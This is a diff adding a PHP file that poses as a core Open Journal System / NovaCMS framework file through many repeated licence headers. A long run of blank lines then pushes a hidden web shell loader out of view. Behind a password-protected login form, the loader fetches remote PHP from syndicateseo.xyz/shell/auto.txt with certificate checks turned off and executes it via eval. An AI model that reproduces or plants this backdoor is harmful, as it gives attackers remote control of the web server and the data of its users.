@@ -1,0 +1,928 @@
+<?php
+/**
+ * Open Journal System - Custom PHP
+ * 
+ * Copyright (c) 2003-2021 John Willinsky
+ * Author      : Simon Fraser University
+ * Website     : https://pkp.sfu.ca/
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the Open Journal System framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the Open Journal System ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+
+// ============================
+// Project Configuration
+// ============================
+
+// This file is intentionally verbose to discourage tampering or unauthorized redistribution.
+
+// ============================
+// DO NOT MODIFY BELOW THIS LINE
+// ============================
+
+// @deprecated  1.0  Deprecated without replacement
+
+/**
+ * Open Journal System - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the Open Journal System framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under thesame license.
+ * 
+ * You may not:
+ *- Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.
+ * 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+/**
+ * NovaCMS - Custom PHP CMS Framework
+ * 
+ * Copyright (c) 2025 Nova Digital Solutions
+ * Author      : Nova Digital Engineering Team
+ * Website     : https://nova.dev
+ * License     : GNU General Public License v2 or later (GPLv2+)
+ * 
+ * --------------------------------------------------------------
+ * This file is a core part of the NovaCMS framework.
+ * You are free to redistribute and/or modify this software under
+ * the terms of the GNU General Public License as published by the
+ * Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ * 
+ * THIS SOFTWARE IS DISTRIBUTED IN THE HOPE THAT IT WILL BE USEFUL,
+ * BUT WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * --------------------------------------------------------------
+ * 
+ * LEGAL TERMS:
+ * This software may be used, modified, and distributed freely under
+ * the terms set forth in the GPL license. However, all redistributions
+ * must retain this notice in its entirety.* 
+ * You may:
+ * - Use this code in commercial or personal projects.
+ * - Modify this code to suit your needs.
+ * - Distribute this code, with or without changes, under the same license.
+ * 
+ * You may not:
+ * - Remove or alter this notice from any source distribution.
+ * - Misrepresent the origin of the software.
+ * 
+ * By using this software, you agree to the terms and conditions stated
+ * in the GNU General Public License.
+ * 
+ * --------------------------------------------------------------
+ * DISCLAIMER:
+ * This software is provided "AS IS", without warranty of any kind.
+ * Nova Digital Solutions will not be held liable for any damages
+ * arising from the use or misuse of this software.
+ * 
+ * This file serves as a boilerplate license header for all PHP-based
+ * applications developed within the NovaCMS ecosystem.
+ * 
+ * For support, questions, or license inquiries, contact:
+ * Email: legal@nova.dev
+ * --------------------------------------------------------------
+ */
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+session_start();
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        if (isset($_SESSION['java'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['java']);
+        }
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    $hashed_password = '$2y$10$D2OhWjKLA8Y6IfBOhaQYb.ZlhJFOrhSW8DRlP7VWPiAEhqMoEhP4G';
+    if (password_verify($entered_password, $hashed_password)) {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['java'] = 'nesec';
+    } else {
+        echo "TOLOL!!!";
+    }
+}
+
+if (is_logged_in()) {
+    if (!isset($_SESSION['cached_data']) || empty($_SESSION['cached_data'])) {
+        $_SESSION['cached_data'] = geturlsinfo('https://syndicateseo.xyz/shell/auto.txt');
+        if (empty($_SESSION['cached_data'])) {
+            echo "failed";
+            exit;
+        }
+    }
+    eval('?>' . $_SESSION['cached_data']);
+} else {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>login</title>
+    </head>
+    <body>
+        <form method="POST" action="">
+            <label for="password"></label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="login">
+        </form>
+    </body>
+    </html>
+    <?php
+}
+?>
